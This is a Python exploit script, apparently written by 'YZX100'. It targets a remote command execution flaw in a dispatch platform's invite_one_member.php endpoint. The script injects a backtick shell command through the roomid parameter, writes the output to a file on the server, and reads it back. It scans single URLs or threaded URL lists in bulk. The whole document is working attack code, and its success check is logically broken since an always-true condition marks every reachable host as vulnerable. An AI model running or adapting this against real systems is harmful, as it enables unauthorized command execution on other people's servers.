import requests
import argparse
import threading


def invite(url,result):
    create_url1 = url + "/api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt`"
    # 构造请求的URL地址->此请求为命令执行写入指定文件
    create_url2 = url + "/api/client/audiobroadcast/1.txt"
    # 构造请求的URL地址->此请求为写入成功后的请求地址

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Connection":"close",
        "Cookie":"PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2",
        "Upgrade-Insecure-Requests":"1"
    }
    # 构造请求数据与请求头中的部分内容

    try:
        req1 = requests.get(create_url1,timeout=5)
        req2 = requests.get(create_url2,timeout=5)
        # 请求命令执行
        if (req1.status_code == 200):
            if '''{"st":"0","roomid":"`id>1.txt`"}''' in req1.text:
                # 验证是否成功写入文件
                if (req2.status_code == 200):
                    if "uid" or "gid" or "groups" in req2.text:
                        # 验证文件中是否存在指定内容
                        print(f"【+】{url}存在相关的命令执行漏洞")
                        result.append(url)
                    else:
                        print(f"【-】{url}该网址不存在相关命令执行漏洞漏洞")
                else:
                    print(f"【-】{url}该文件请求不到")
            else:
                print(f"【-】{url}写入不成功")
    except:
        print("【-】该网址无法访问或网络连接发生错误")

def invite_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=invite,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在命令执行漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在命令执行漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''
    
     ___  ________   ___      ___ ___  _________  _______      
|\  \|\   ___  \|\  \    /  /|\  \|\___   ___\\  ___ \     
\ \  \ \  \\ \  \ \  \  /  / | \  \|___ \  \_\ \   __/|    
 \ \  \ \  \\ \  \ \  \/  / / \ \  \   \ \  \ \ \  \_|/__  
  \ \  \ \  \\ \  \ \    / /   \ \  \   \ \  \ \ \  \_|\ \ 
   \ \__\ \__\\ \__\ \__/ /     \ \__\   \ \__\ \ \_______\
    \|__|\|__| \|__|\|__|/       \|__|    \|__|  \|_______|
           
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="指挥调度平台invite_one_member存在远程命令执行漏洞")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        invite(args.u, result)
        if result:
            print("\n存在命令执行漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        invite_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()